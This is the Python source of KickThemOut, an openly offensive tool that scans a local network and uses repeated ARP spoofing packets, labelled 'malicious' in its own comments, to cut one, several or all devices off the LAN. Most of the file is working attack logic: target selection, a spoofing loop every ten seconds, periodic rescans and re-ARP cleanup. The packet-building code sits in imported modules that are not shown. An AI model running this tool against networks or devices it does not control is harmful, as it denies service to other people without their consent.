#!/usr/bin/env python
# -.- coding: utf-8 -.-
# kickthemout.py
# authors: k4m4 & xdavidhu

"""
Copyright (C) 2016 Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Schütz (xdavid@protonmail.com)
See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
"""

import time, os, sys, logging, math
from time import sleep
import urllib2 as urllib
import traceback
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

notRoot = False
try:
    # Check if the user is root
    if os.geteuid() != 0:
        print("\n{0}ERROR: KickThemOut must be run with root privileges. Try again with sudo:\n\t{1}$ sudo python kickthemout.py{2}\n").format(RED, GREEN, END)
        notRoot = True
except:
    # User is probably on windows
    pass
if notRoot:
    raise SystemExit

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
try:
    from scapy.all import *
    import scan, spoof
except:
    print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.").format(RED)
    print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(RED, BLUE, END)
    raise SystemExit

def heading():
    # Function for printing the logo & info
    spaces = " " * 76
    sys.stdout.write(GREEN + spaces + """
    █  █▀ ▄█ ▄█▄    █  █▀    ▄▄▄▄▀  ▄  █ ▄███▄   █▀▄▀█  ████▄   ▄      ▄▄▄▄▀
    █▄█   ██ █▀ ▀▄  █▄█   ▀▀▀ █    █   █ █▀   ▀  █ █ █  █   █    █  ▀▀▀ █
    █▀▄   ██ █   ▀  █▀▄       █    ██▀▀█ ██▄▄    █ ▄ █  █   █ █   █     █
    █  █  ▐█ █▄  ▄▀ █  █     █     █   █ █▄   ▄▀ █   █  ▀████ █   █    █
     █    ▐ ▀███▀    █     ▀         █  ▀███▀      █         █▄ ▄█   ▀
     ▀               ▀               ▀             ▀           ▀▀▀
    """ + END + BLUE +
    '\n' + '{0}Kick Devices Off Your LAN ({1}KickThemOut{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(98) +
    '\n' + 'Made With <3 by: {0}Nikolaos Kamarinakis ({1}k4m4{2}) & {0}David Schütz ({1}xdavidhu{2}){3}'.format(
        YELLOW, RED, YELLOW, BLUE).center(111) +
    '\n' + 'Version: {0}0.1{1}\n'.format(YELLOW, END).center(86))

def optionBanner():
    # Function for printing the list of available commands
    print('\nChoose option from menu:\n')
    sleep(0.2)
    print('\t{0}[{1}1{2}]{3} Kick ONE Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}2{2}]{3} Kick SOME Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}3{2}]{3} Kick ALL Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)

def runDebug():
    # Function for printing values & variables for debug
    print("\n\n{0}WARNING! An unknown error has occurred, starting debug...{1}").format(RED, END)
    print(
    "{0}Starting debug... (Please report this crash on 'https://github.com/k4m4/kickthemout/issues' with your private information removed where necessary){1}").format(
        RED, END)
    print("{0}").format(RED)
    try:
        print("Current defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to print defaultGatewayMac...")
    try:
        print ("Reloading mac getter function...")
        regenOnlineIPs()
        print("Reloaded defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to reload mac getter function / to print defaultGatewayMac...")
    try:
        print ("Known gateway IP: " + defaultGatewayIP)
    except:
        print ("Failed to print defaultGatewayIP...")
    try:
        print ("Current hostslist array: ")
        print hostsList
    except:
        print ("Failed to print hostsList array...")
    try:
        print ("Crash trace: ")
        print(traceback.format_exc())
    except:
        print ("Failed to print crash trace...")
    print ("DEBUG FINISHED.\nShutting down...")
    print("{0}").format(END)
    raise SystemExit

def regenOnlineIPs():
    # Function for regenerating the onlineIPs array (made from the hostsLists array from the scan,
    # but only with the IP's in it) and setting gateway's IP, and checking if its mac address is set
    global onlineIPs
    global defaultGatewayMac
    global defaultGatewayMacSet

    if not defaultGatewayMacSet:
        defaultGatewayMac = ""

    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if not defaultGatewayMacSet:
            if host[0] == defaultGatewayIP:
                defaultGatewayMac = host[1]

    if not defaultGatewayMacSet and defaultGatewayMac == "":
        # Ask for the gateway's mac address if scapy failed to detect it
        print("\n{0}ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
        header = ("{0}kickthemout{1}> {2}Enter your gateway's MAC Address {3}(MM:MM:MM:SS:SS:SS): ".format(BLUE, WHITE, RED, END))
        defaultGatewayMac = raw_input(header)
        defaultGatewayMacSet = True

def scanNetwork():
    # Function for scanning the network with the 'scan.py'
    global hostsList
    try:
        # Passing the network variable to the scan with the 'True' setting of the getDefaultInterface
        hostsList = scan.scanNetwork(getDefaultInterface(True))
    except KeyboardInterrupt:
        print('\n\n{0}Thanks for dropping by.\nCatch ya later!{1}').format(GREEN, END)
        raise SystemExit
    except:
        print("\n{0}ERROR: Network scanning failed. Please check your requirements configuration.{1}\n").format(RED, END)
        raise SystemExit
    # onlineIPs also get regenerated after every scan
    regenOnlineIPs()

def kickoneoff():
    # kickoneoff function, launched if the user selects the number for this from the optionBanner
    os.system("clear||cls")

    print("\n{0}kickONEOff{1} selected...{2}\n").format(RED, GREEN, END)
    scanNetwork()

    # Print the list of online IP's with vendors
    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t"+ vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)

    canBreak = False
    while not canBreak:
        # Get the input for which IP to target
        try:
            choice = int(raw_input("\nChoose a target: "))
            one_target_ip = onlineIPs[choice]
            canBreak = True
        except KeyboardInterrupt:
            return
        except:
            print("\n{0}ERROR: Please enter a number from the list!{1}").format(RED, END)

    # Get the mac address of the IP by looping trough the hostList array
    one_target_mac = ""
    for host in hostsList:
        if host[0] == one_target_ip:
            one_target_mac = host[1]
    if one_target_mac == "":
        print("\nIP address is not up. Please try again.")
        return

    print("\n{0}Target: {1}" + one_target_ip).format(GREEN, END)

    print("\n{0}Spoofing started... {1}").format(GREEN, END)
    try:
        while True:
            # Send a malicious ARP packet in every 10 second
            spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
            time.sleep(10)
    except KeyboardInterrupt:
        # Re-arp on KeyboardInterrupt
        print("\n{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            try:
                # Send 10 ARP packets with real information to restore the connections
                spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
            except KeyboardInterrupt:
                pass
            except:
                runDebug()
            reArp += 1
            time.sleep(0.5)
        print("{0}Re-arped{1} target successfully.{2}").format(RED, GREEN, END)


def kicksomeoff():
    # kicksomeoff function, launched if the user selects the number for this from the optionBanner
    os.system("clear||cls")

    print("\n{0}kickSOMEOff{1} selected...{2}\n").format(RED, GREEN, END)
    scanNetwork()

    # Print the list of online IP's with vendors
    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t" + vendor + "{4}").format(YELLOW, WHITE, RED, GREEN, END)

    canBreak = False
    while not canBreak:
        # Get the input for which IPs to target
        try:
            choice = raw_input("\nChoose devices to target(comma-separated): ")
            if ',' in choice:
                some_targets = choice.split(",")
                canBreak = True
            else:
                print("\n{0}ERROR: Please select more than 1 devices from the list.{1}\n").format(RED, END)
        except KeyboardInterrupt:
            return

    # Create a string list of the IPs to print it out later
    some_ipList = ""
    for i in some_targets:
        try:
            some_ipList += GREEN + "'" + RED + onlineIPs[int(i)] + GREEN + "', "
        except KeyboardInterrupt:
            return
        except:
            print("\n{0}ERROR: '{1}" + i + "{2}' is not in the list.{3}\n").format(RED, GREEN, RED, END)
            return
    some_ipList = some_ipList[:-2] + END

    # Print the string IP list
    print("\n{0}Targets: {1}" + some_ipList).format(GREEN, END)

    print("\n{0}Spoofing started... {1}").format(GREEN, END)
    try:
        while True:
            # Send [number of targets] malicious ARP packet in every 10 second
            for i in some_targets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            time.sleep(10)
    except KeyboardInterrupt:
        # Re-arp on KeyboardInterrupt
        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            # Send 10 ARP packets with real information to restore the connections to every target
            for i in some_targets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        try:
                            spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                        except KeyboardInterrupt:
                            pass
                        except:
                            runDebug()
            reArp += 1
            time.sleep(0.5)
        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)

def kickalloff():
    # kickalloff function, launched if the user selects the number for this from the optionBanner
    os.system("clear||cls")

    print("\n{0}kickALLOff{1} selected...{2}\n").format(RED, GREEN, END)
    scanNetwork()

    # Print the list of online IP's with vendors
    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print(str("  {0}"+ str(onlineIPs[i]) + "{1}\t" + vendor + "{2}").format(RED, GREEN, END))

    print("\n{0}Spoofing started... {1}").format(GREEN, END)
    try:
        # Send [number of hosts in hostsList array] malicious ARP packet in every 10 second
        reScan = 0
        while True:
            for host in hostsList:
                # Loop trough hostsList array
                if host[0] != defaultGatewayIP:
                    # Only sent the packet if the target is not the gateway
                    spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            reScan += 1
            if reScan == 4:
                reScan = 0
                scanNetwork()
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
        reArp = 1
        while reArp != 10:
            # Send 10 ARP packets with real information to restore the connections to every target
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    try:
                        # Only sent the packet if the target is not the gateway
                        spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                    except KeyboardInterrupt:
                        pass
                    except:
                        runDebug()
            reArp += 1
            time.sleep(0.5)
        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)

def getDefaultInterface(returnNet=False):
    # Function for getting the default network interface of the machine with scapy
    def long2net(arg):
        if (arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("illegal netmask value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = scapy.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            return None
        return net
    for network, netmask, _, interface, address in scapy.config.conf.route.routes:
        # Loop trough ip addresses, skip if local
        if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
            continue
        if netmask <= 0 or netmask == 0xFFFFFFFF:
            continue
        net = to_CIDR_notation(network, netmask)
        if interface != scapy.config.conf.iface:
            continue
        if net:
            if returnNet:
                # Returning network if the returnNet is set to True (for the network scan)
                return net
            else:
                return interface

def getGatewayIP():
    # Function for getting the IP of the gateway with scapy
    try:
        getGateway_p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        return getGateway_p.src
    except:
        # Ask for the gateway ip address if scapy failed to detect it
        print("\n{0}ERROR: Gateway IP could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
        header = ('{0}kickthemout{1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
        gatewayIP = raw_input(header)
        return gatewayIP

def getDefaultInterfaceMAC():
    # Function for getting the mac address of the default interface
    try:
        defaultInterfaceMac = get_if_hwaddr(defaultInterface)
        if defaultInterfaceMac == "" or not defaultInterfaceMac:
            print(
            "\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(
                RED, END)
            header = ('{0}kickthemout{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
            defaultInterfaceMac = raw_input(header)
            return defaultInterfaceMac
        else:
            return defaultInterfaceMac
    except:
        # Ask for the mac address if scapy failed to detect it
        print("\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
        header = ('{0}kickthemout{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
        defaultInterfaceMac = raw_input(header)
        return defaultInterfaceMac

def resolveMac(mac):
    # Function for resolving mac addresses to vendor names
    try:
        # Sending web request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urllib.urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except:
        return "N/A"

def main():

    # Print the KickThemOut logo
    heading()

    print(
        "\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}"
        + defaultGatewayIP + "{6}' --> {7}" + str(len(hostsList)) + "{8} hosts are up.{9}").format(GREEN, RED, GREEN, RED, GREEN, 
                                                                                                RED, GREEN, RED, GREEN, END)
    # Print warnings if there are no hosts up
    if len(hostsList) == 0 or len(hostsList) == 1:
        if len(hostsList) == 1:
            if hostsList[0][0] == defaultGatewayIP:
                # If gateway found by the scan
                print("\n{0}{1}WARNING: There are {2}0{3} hosts up on you network except your gateway.\n\tYou can't kick anyone off {4}:/{5}\n").format(
                    GREEN, RED, GREEN, RED, GREEN, END)
                raise SystemExit
        else:
            # If no gateway or host found by the scan
            print(
            "\n{0}{1}WARNING: There are {2}0{3} hosts up on you network.\n\tIt looks like something went wrong {4}:/{5}").format(
                GREEN, RED, GREEN, RED, GREEN, END)
            print(
            "\n{0}If you are experiencing this error multiple times, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(
                RED, BLUE, END)
            raise SystemExit

    try:

        # Getting user input with while loop
        while True:

            # Print menu items
            optionBanner()

            # Get user input
            header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
            choice = raw_input(header)

            # Handling the input
            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('\n{0}Thanks for dropping by.'
                      '\nCatch ya later!{1}').format(GREEN, END)
                raise SystemExit
            elif choice == '1':
                kickoneoff()
            elif choice == '2':
                kicksomeoff()
            elif choice == '3':
                kickalloff()
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            else:
                print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)

    # Stopping loop on KeyboardInterrupt
    except KeyboardInterrupt:
        print('\n\n{0}Thanks for dropping by.'
              '\nCatch ya later!{1}').format(GREEN, END)

if __name__ == '__main__':

    # -- Start point --

    # Setting the network info variables
    sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    defaultInterface = getDefaultInterface()
    defaultGatewayIP = getGatewayIP()
    defaultInterfaceMac = getDefaultInterfaceMAC()
    global defaultGatewayMacSet
    defaultGatewayMacSet = False
    # Scanning network for the first time
    scanNetwork()

    main()
